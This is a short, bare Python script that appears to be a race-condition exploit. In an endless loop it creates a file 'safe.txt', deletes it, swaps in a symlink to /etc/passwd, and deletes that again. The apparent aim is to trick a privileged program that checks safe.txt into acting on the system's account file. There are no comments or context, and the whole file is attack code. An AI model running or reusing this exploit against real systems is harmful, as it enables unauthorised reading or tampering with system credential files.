
import os

while True:

	f = open("safe.txt", "w")
	f.close()

	os.remove("safe.txt")

	os.symlink("/etc/passwd", "safe.txt")

	os.remove("safe.txt")
